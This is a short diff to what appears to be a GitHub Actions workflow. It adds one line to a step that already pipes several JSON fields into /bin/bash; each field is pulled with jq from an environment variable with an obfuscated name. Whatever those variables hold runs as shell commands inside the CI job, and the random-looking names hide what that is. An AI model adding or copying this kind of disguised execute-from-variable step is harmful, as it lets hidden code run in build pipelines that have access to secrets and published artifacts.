@@ -39,6 +39,7 @@ jobs:
           echo $lotc31 | jq -r .livq416 | /bin/bash
           printf '%s' "$ohmd4" | jq -r .rtmdo3837 | /bin/bash
           printf '%s' "$dbou0" | jq -r .prdui446 | /bin/bash
+          printf '%s' "$y30" | jq -r .hmb07199 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
